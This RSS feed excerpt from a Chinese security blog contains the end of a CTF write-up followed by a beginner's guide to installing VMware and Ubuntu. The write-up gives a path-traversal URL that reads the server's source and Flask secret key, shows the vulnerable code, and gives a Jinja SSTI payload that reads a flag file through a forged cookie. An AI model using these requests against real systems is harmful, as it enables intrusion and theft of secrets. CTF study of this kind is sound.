&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ol&gt;
&lt;li&gt;请求 http://IP:PORT/article?name=../../../../../proc/self/cwd/server.py获取源码&lt;/li&gt;
&lt;li&gt;审计源码，发现flag在flag.py,flask的appkey在key.py,但是此处任意文件读取漏洞被过滤了关键词flag&lt;/li&gt;
&lt;li&gt;源码里存在flask SSTI，前提是可以伪造flask的cookie，这里需要用到appkey &lt;a class=&#34;link&#34; href=&#34;https://noraj.github.io/flask-session-cookie-manager/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://noraj.github.io/flask-session-cookie-manager/&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nd&#34;&gt;@app.route&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/n1page&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;methods&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;GET&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;POST&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;n1page&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;():&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;request&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;method&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;POST&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;redirect&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;url_for&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;index&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;n1code&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;request&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;form&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;get&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;n1code&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;None&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;n1code&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;is&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;not&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;None&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;n1code&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;n1code&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;.&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;_&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;{&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;}&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;n1code&amp;#34;&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;not&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;session&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;session&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;n1code&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;is&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;None&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;session&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;n1code&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;n1code&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;template&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;None&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;session&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;n1code&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;is&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;not&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;None&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;     &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;     这里存在SSTI
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;     &amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;template&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&amp;#39;&amp;lt;h1&amp;gt;N1 Page&amp;lt;/h1&amp;gt; &amp;lt;div class=&amp;#34;row&amp;gt; &amp;lt;div class=&amp;#34;col-md-6 col-md-offset-3 center&amp;#34;&amp;gt; Hello : &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;%s&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;, why you don&amp;#39;t look at our &amp;lt;a href=&amp;#39;/article?name=article&amp;#39;&amp;gt;article&amp;lt;/a&amp;gt;? &amp;lt;/div&amp;gt; &amp;lt;/div&amp;gt; &amp;#39;&amp;#39;&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;session&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;n1code&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;session&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;n1code&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;None&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;render_template_string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;template&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;所以请求 http://IP:PORT/article?name=../../../../../proc/self/cwd/key.py获取appkey&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;伪造cookie为SSTI的payload获取flag.&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;{{&amp;#39;&amp;#39;.__class__.__mro__[2].__subclasses__()[40](&amp;#39;flag.py&amp;#39;).read()}}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;</description>
        </item>
        <item>
        <title>Linux和VMWare</title>
        <link>https://dorinxl.github.io/p/linux%E5%92%8Cvmware/</link>
        <pubDate>Sun, 04 Oct 2020 07:34:00 +0000</pubDate>
        
        <guid>https://dorinxl.github.io/p/linux%E5%92%8Cvmware/</guid>
        <description>&lt;h1 id=&#34;前言&#34;&gt;前言
&lt;/h1&gt;&lt;hr&gt;
&lt;br/&gt;
&lt;p&gt;       &lt;em&gt;&lt;strong&gt;本文写给刚刚入门的安全学子，对Linux和VMWare做一个简单的介绍。&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;       在学习安全的道路上，我们需要很多利器来帮助自己修炼。不管你是什么方向，总会需要借助各种神奇而强大的工具来学习进步。在此篇文章中，你将认识到另一种操作系统：Linux，并对操作系统这一概念有一初步了解。此外，这篇文章还会像各种攻略一样指导你安装VMWare Workstation，并在此基础上安装ubuntu。&lt;/p&gt;
&lt;br/&gt;
&lt;h1 id=&#34;关于linux&#34;&gt;关于Linux
&lt;/h1&gt;&lt;hr&gt;
&lt;br/&gt;
&lt;p&gt;       如果你在各种搜索引擎上搜索“Linux”，那么你将得到很多生涩而且难以理解的词语组成的难以消化的句子。但是问题不大，当你真正开始使用他的时候你就会对linux产生自己的理解。如果对操作系统这一概念及相关知识很感兴趣，那么你完全可以在浩瀚的网络世界中寻找资料开始自学。在后续的学习中学院也会开设相应课程。&lt;/p&gt;
&lt;p&gt;       &lt;strong&gt;火焰病毒&lt;/strong&gt;学长已经在协会的博客中介绍过Linux，此处我便不再赘述&amp;ndash;&amp;gt; ​&lt;a class=&#34;link&#34; href=&#34;http://cdutsec.gitee.io/blog/2020/03/28/why-linux/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Why Linux?&lt;/a&gt;&lt;/p&gt;
&lt;br/&gt;
&lt;h1 id=&#34;关于vmware&#34;&gt;关于VMWare
&lt;/h1&gt;&lt;hr&gt;
&lt;br/&gt;
&lt;h2 id=&#34;nbsp-nbsp--什么是vmware&#34;&gt;   &amp;ndash;&amp;gt;什么是VMWare?
&lt;/h2&gt;&lt;br/&gt;
&lt;p&gt;       VMware是“虚拟PC”软件公司，提供服务器、桌面虚拟化解决方案。该公司旗下有多款产品，其中VMware Workstation产品一直受到全球广大用户的认可，它的产品可以使你在一台机器上同时运行二个或更多Windows、DOS、Linux、Mac系统。&lt;/p&gt;
&lt;p&gt;       VMWare Workstation作为一款功能强大的桌面虚拟计算机软件，为用户提供可在单一的桌面上同时运行不同的操作系统，和进行开发、测试、部署新的应用程序的最佳解决方案。&lt;/p&gt;
&lt;p&gt;       与“多启动”系统相比，VMware采用了完全不同的概念。多启动系统在一个时刻只能运行一个系统，在系统切换时需要重新启动机器。VMware是真正“同时”运行多个操作系统在主系统的平台上，就像标准Windows应用程序那样切换。而且每个操作系统你都可以进行虚拟的分区、配置而不影响真实硬盘的数据，你甚至可以通过网卡将几台虚拟机用网卡连接为一个局域网，这一切不会影响你的主机操作和任何操作系统或者其它正在运行的应用程序。极其方便。&lt;/p&gt;
&lt;p&gt;       &lt;em&gt;&lt;strong&gt;简单来说，VMWare是很牛逼的公司，他家有很多很牛逼的产品，我们在学习安全的过程中需要用到他家的东西，他家的东西我们不仅要用，还要用好。&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;br/&gt;
&lt;h2 id=&#34;nbsp-nbsp--vmware-workstation的安装&#34;&gt;   &amp;ndash;&amp;gt;VMWare Workstation的安装
&lt;/h2&gt;&lt;br/&gt;
&lt;p&gt;       VMware Workstation Pro16是在单个Linux或Windows PC上以虚拟机（VM）形式运行多个操作系统的行业标准。为任何设备、平台或云构建、测试或演示软件的IT专业人员、开发人员和企业都依赖Workstation Pro。&lt;/p&gt;
&lt;p&gt;       VMware Workstation Pro16虚拟机不知不觉更新到了16了，与时俱进，一起来安装VMware Workstation Pro16。&lt;/p&gt;
&lt;p&gt;       &lt;strong&gt;官方下载地址：https://www.vmware.com/products/workstation-pro.html&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;安装步骤&#34;&gt;安装步骤
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;双击下载的应用程序文件，点击下一步。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/linux%E5%92%8Cvmware/1600823309749945.jpg&#34;
	width=&#34;494&#34;
	height=&#34;392&#34;
	srcset=&#34;https://dorinxl.github.io/p/linux%E5%92%8Cvmware/1600823309749945_hu6895837722979010838.jpg 480w, https://dorinxl.github.io/p/linux%E5%92%8Cvmware/1600823309749945_hu6534235942603910424.jpg 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;2.jpg&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;126&#34;
		data-flex-basis=&#34;302px&#34;
	
&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;勾选协议条款，点击下一步。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/linux%E5%92%8Cvmware/1600823335504904.jpg&#34;
	width=&#34;491&#34;
	height=&#34;393&#34;
	srcset=&#34;https://dorinxl.github.io/p/linux%E5%92%8Cvmware/1600823335504904_hu18043134518097757957.jpg 480w, https://dorinxl.github.io/p/linux%E5%92%8Cvmware/1600823335504904_hu602536137799224580.jpg 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;3.jpg&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;124&#34;
		data-flex-basis=&#34;299px&#34;
	
&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;勾选增强型键盘驱动程序，并更改软件安装目录，如果你想默认安装到c盘可以不用更改。（不过建议一定要好好整理自己的各类文件夹，内存不够就加盘，分类明确更有助于使用电脑）&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/linux%E5%92%8Cvmware/1600823356812817.jpg&#34;
	width=&#34;497&#34;
	height=&#34;392&#34;
	srcset=&#34;https://dorinxl.github.io/p/linux%E5%92%8Cvmware/1600823356812817_hu10087339013312326429.jpg 480w, https://dorinxl.github.io/p/linux%E5%92%8Cvmware/1600823356812817_hu177067615605844124.jpg 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;4.jpg&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;126&#34;
		data-flex-basis=&#34;304px&#34;
	
&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;用户体验设置：看自己的意愿了。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/linux%E5%92%8Cvmware/1600823370680521.jpg&#34;
	width=&#34;493&#34;
	height=&#34;389&#34;
	srcset=&#34;https://dorinxl.github.io/p/linux%E5%92%8Cvmware/1600823370680521_hu6267265931719196518.jpg 480w, https://dorinxl.github.io/p/linux%E5%92%8Cvmware/1600823370680521_hu15225553309285558684.jpg 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;5.jpg&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;126&#34;
		data-flex-basis=&#34;304px&#34;
	
&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;快捷方式：看自己的意愿了。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/linux%E5%92%8Cvmware/1600823406309557.jpg&#34;
	width=&#34;493&#34;
	height=&#34;398&#34;
	srcset=&#34;https://dorinxl.github.io/p/linux%E5%92%8Cvmware/1600823406309557_hu17434496927149916344.jpg 480w, https://dorinxl.github.io/p/linux%E5%92%8Cvmware/1600823406309557_hu17521090902528438642.jpg 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;6.jpg&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;123&#34;
		data-flex-basis=&#34;297px&#34;
	
&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;点击安装。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/linux%E5%92%8Cvmware/1600823423256039.jpg&#34;
	width=&#34;490&#34;
	height=&#34;389&#34;
	srcset=&#34;https://dorinxl.github.io/p/linux%E5%92%8Cvmware/1600823423256039_hu13986042056874028997.jpg 480w, https://dorinxl.github.io/p/linux%E5%92%8Cvmware/1600823423256039_hu16006278234444173961.jpg 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;7.jpg&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;125&#34;
		data-flex-basis=&#34;302px&#34;
	
&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;点击完成，安装完毕！&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/linux%E5%92%8Cvmware/1600823458200785.jpg&#34;
	width=&#34;495&#34;
	height=&#34;392&#34;
	srcset=&#34;https://dorinxl.github.io/p/linux%E5%92%8Cvmware/1600823458200785_hu9520451225718376460.jpg 480w, https://dorinxl.github.io/p/linux%E5%92%8Cvmware/1600823458200785_hu12001836416638230416.jpg 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;9.jpg&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;126&#34;
		data-flex-basis=&#34;303px&#34;
	
&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;提示重启启动，选择是重启系统。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/linux%E5%92%8Cvmware/1600823475638565.jpg&#34;
	width=&#34;359&#34;
	height=&#34;173&#34;
	srcset=&#34;https://dorinxl.github.io/p/linux%E5%92%8Cvmware/1600823475638565_hu5223139300010691922.jpg 480w, https://dorinxl.github.io/p/linux%E5%92%8Cvmware/1600823475638565_hu17358745797145700640.jpg 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;10.jpg&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;207&#34;
		data-flex-basis=&#34;498px&#34;
	
&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;打开Vmware Workstation Pro16,，提示输入秘钥，否则会试用期是30天使用时间。（关于秘钥，作为学生大概是买不起的，但是方法总比困难多，咳咳）&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/linux%E5%92%8Cvmware/1600823493101082.jpg&#34;
	width=&#34;375&#34;
	height=&#34;312&#34;
	srcset=&#34;https://dorinxl.github.io/p/linux%E5%92%8Cvmware/1600823493101082_hu10661595850629950273.jpg 480w, https://dorinxl.github.io/p/linux%E5%92%8Cvmware/1600823493101082_hu12874650634858683311.jpg 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;11.jpg&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;120&#34;
		data-flex-basis=&#34;288px&#34;
	
&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;至此，Vmware Workstation Pro16已经完成安装和激活。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/linux%E5%92%8Cvmware/1600823527979483.jpg&#34;
	width=&#34;1434&#34;
	height=&#34;738&#34;
	srcset=&#34;https://dorinxl.github.io/p/linux%E5%92%8Cvmware/1600823527979483_hu3741251373393586467.jpg 480w, https://dorinxl.github.io/p/linux%E5%92%8Cvmware/1600823527979483_hu1667873588546741379.jpg 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;13.jpg&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;194&#34;
		data-flex-basis=&#34;466px&#34;
	
&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;br/&gt;
&lt;h1 id=&#34;关于虚拟机&#34;&gt;关于虚拟机
&lt;/h1&gt;&lt;hr&gt;
&lt;br/&gt;
&lt;h2 id=&#34;nbsp-nbsp--什么是虚拟机virtual-machine&#34;&gt;   &amp;ndash;&amp;gt;什么是虚拟机？(Virtual Machine)
&lt;/h2&gt;&lt;br/&gt;
&lt;p&gt;       简单点说，我们安装了VMWare Workstation，也就相当于安装好了底座，现在我们要在此基础上添加操作系统作为虚拟机使用。装好之后我们就可以在windows上玩linux或者其他别的什么了。&lt;/p&gt;
&lt;br/&gt;
&lt;h2 id=&#34;nbsp-nbsp--安装你的系统以ubuntu1604为例&#34;&gt;   &amp;ndash;&amp;gt;安装你的系统(以ubuntu16.04为例)
&lt;/h2&gt;&lt;br/&gt;
&lt;h3 id=&#34;前期准备&#34;&gt;前期准备：
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;VMware Workstation&lt;/li&gt;
&lt;li&gt;镜像文件(想要在vm上运行其他的系统，我们需要镜像文件(.iso)来作为安装介质。)&lt;/li&gt;
&lt;/ol&gt;
&lt;br/&gt;
&lt;h4 id=&#34;それではゲームを始めましょう&#34;&gt;それでは、ゲームを始めましょう!
&lt;/h4&gt;&lt;br/&gt;
&lt;h3 id=&#34;安装步骤-1&#34;&gt;安装步骤：
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;下载VM（已完成，这里是vm14版本的，最新的16版步骤都差不多）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;下载镜像文件。这里推荐几个下载网址：&lt;/p&gt;
&lt;p&gt;官方：[https://www.ubuntu.com/download]&lt;/p&gt;
&lt;p&gt;中科大源：[http://mirrors.ustc.edu.cn/ubuntu-releases/16.04/]&lt;/p&gt;
&lt;p&gt;阿里云开源镜像站：[http://mirrors.aliyun.com/ubuntu-releases/16.04/]&lt;/p&gt;
&lt;p&gt;兰州大学开源镜像站：[http://mirror.lzu.edu.cn/ubuntu-releases/16.04/]&lt;/p&gt;
&lt;p&gt;北京理工大学开源：[http://mirror.bit.edu.cn/ubuntu-releases/16.04/]&lt;/p&gt;
